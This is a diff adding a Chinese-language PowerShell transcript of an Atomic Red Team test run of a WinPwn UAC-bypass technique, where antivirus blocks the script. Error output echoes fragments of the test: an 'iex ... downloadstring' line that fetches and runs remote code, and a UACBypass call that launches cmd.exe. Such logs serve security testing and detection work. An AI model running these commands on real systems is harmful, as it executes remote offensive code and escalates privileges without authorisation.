@@ -1,0 +1,50 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415165639
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Invoke-AtomicTest T1548.002-20
+进程 ID: 12216
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>Invoke-AtomicTest T1548.002-20
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+Executing test:
+T1548.002-20 WinPwn - UAC Bypass DiskCleanup technique
+
+iex : 所在位置 行:1 字符: 1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
+此脚本包含恶意内容，已被你的防病毒软件阻止。
+所在位置 行:2 字符: 1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+ 
+UACBypass : 无法将“UACBypass”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径
+正确，然后再试一次。
+所在位置 行:3 字符: 1
++ UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -tec ...
++ ~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (UACBypass:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+Done executing test:
+T1548.002-20 WinPwn - UAC Bypass DiskCleanup technique
+
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230415165648
+**********************
